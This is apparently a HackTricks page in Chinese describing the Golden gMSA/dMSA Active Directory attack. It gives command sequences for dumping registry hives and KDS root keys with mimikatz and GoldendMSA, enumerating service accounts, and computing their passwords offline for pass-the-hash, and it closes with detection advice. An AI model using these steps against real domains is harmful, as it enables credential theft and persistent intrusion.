# Golden gMSA/dMSA Attack (离线推导 Managed Service Account 密码)

{{#include ../../banners/hacktricks-training.md}}

## 概述

Windows Managed Service Accounts (MSA) 是一种特殊的 principal，旨在运行服务，而无需手动管理其密码。
主要有两种类型：

1. **gMSA** – group Managed Service Account – 可在多个主机上使用，这些主机必须已在其 `msDS-GroupMSAMembership` 属性中获得授权。
2. **dMSA** – delegated Managed Service Account – gMSA 的（预览版）后继者，依赖相同的 cryptography，但支持更精细的 delegation 场景。

对于这两种类型，**密码不会**像常规 NT-hash 一样存储在每个 Domain Controller (DC) 上。相反，每个 DC 都可以根据以下内容即时**推导**当前密码：

* forest-wide **KDS Root Key** (`KRBTGT\KDS`)  – 随机生成的、以 GUID 命名的 secret，会复制到每个 DC，并存储在 `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` container 下。
* 目标 account 的 **SID**。
* 在 `msDS-ManagedPasswordId` attribute 中找到的、每个 account 对应的 **ManagedPasswordID** (GUID)。

推导过程为：`AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 byte blob，最后进行 **base64-encoded**，并存储在 `msDS-ManagedPassword` attribute 中。
正常使用密码时不需要 Kerberos traffic 或 domain interaction – 只要知道这三个 input，member host 就能在本地推导密码。

## Golden gMSA / Golden dMSA Attack

如果 attacker 能够**离线**获取全部三个 input，就可以为 forest 中的**任意 gMSA/dMSA**计算出**当前及未来的有效密码**，无需再次接触 DC，从而绕过：<sup>[[1]](#references)[[2]](#references)</sup>

* LDAP read auditing
* Password change intervals（可以预先计算）

这类似于 service accounts 的 *Golden Ticket*。<sup>[[1]](#references)[[2]](#references)</sup>

### 前提条件

1. **Forest-level compromise** **一个 DC**（或 Enterprise Admin），或者拥有 forest 中某个 DC 的 `SYSTEM` access。
2. 能够枚举 service accounts（LDAP read / RID brute-force）。
3. 使用 .NET ≥ 4.7.2 x64 workstation 运行 [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) 或等效代码。

### Golden gMSA / dMSA
#### Phase 1 – 提取 KDS Root Key

从任意 DC dump（Volume Shadow Copy / raw SAM+SECURITY hives 或 remote secrets）：<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
标记为 `RootKey`（GUID 名称）的 base64 字符串将在后续步骤中使用。<sup>[[1]](#references)[[2]](#references)</sup>

##### 阶段 2 – 枚举 gMSA / dMSA 对象

至少获取 `sAMAccountName`、`objectSid` 和 `msDS-ManagedPasswordId`：<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) 实现了辅助模式：<sup>[[1]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### 阶段 3 – Guess / Discover ManagedPasswordID（缺失时）

某些部署会在受 ACL 保护的读取操作中*移除* `msDS-ManagedPasswordId`。  
由于 GUID 为 128 位，直接进行 bruteforce 不可行，但：

1. 前 **32 位 =** 账户创建时的 Unix epoch time（精确到分钟）。
2. 后面跟随 96 位随机数据。

因此，为每个账户生成一个**窄范围 wordlist**（前后几小时）是现实可行的。
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
该工具计算候选密码，并将其 base64 blob 与真实的 `msDS-ManagedPassword` 属性进行比较——匹配结果会揭示正确的 GUID。

##### Phase 4 – Offline Password Computation & Conversion

确定 ManagedPasswordID 后，只需执行一条命令即可获取有效密码：<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
生成的 hashes 可通过 **mimikatz**（`sekurlsa::pth`）或 **Rubeus** 注入，用于 Kerberos abuse，从而实现隐蔽的 **lateral movement** 和 **persistence**。

## 检测与缓解

* 将 **DC backup and registry hive read** capabilities 限制为 Tier-0 administrators。
* 监控 DC 上 **Directory Services Restore Mode (DSRM)** 或 **Volume Shadow Copy** 的创建。
* 审计对 `CN=Master Root Keys,…` 的读取 / 修改，以及服务账户的 `userAccountControl` flags。
* 检测异常的 **base64 password writes**，或跨主机突然复用 service password。
* 如果无法实现 Tier-0 isolation，可考虑将高权限 gMSA 转换为 **classic service accounts**，并定期进行随机轮换。

## 工具

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – 本页面使用的 reference implementation。<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – 本页面使用的 reference implementation。
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`、`sekurlsa::pth`、`kerberos::ptt`。
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – 使用派生 AES keys 进行 pass-the-ticket。

## 参考资料

- [1] [Golden dMSA – delegated Managed Service Accounts 的 authentication bypass](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
